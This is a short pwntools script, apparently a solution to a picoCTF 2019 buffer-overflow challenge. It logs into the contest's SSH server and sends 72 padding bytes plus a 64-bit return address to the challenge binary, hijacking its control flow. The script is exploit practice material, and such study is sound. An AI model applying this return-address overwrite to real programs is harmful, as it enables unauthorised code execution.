from pwn import *

USER = ""
PASS = ""

conn = ssh(host="2019shell1.picoctf.com", user=USER, password=PASS)
conn.set_working_directory(b"/problems/newoverflow-2_0_b7d9b3bbdbb843a28a13ff1aa57410df")

payload = "A" * 72
payload += p64(0x000000000040084e)
p = conn.process('./vuln')

p.send(payload)


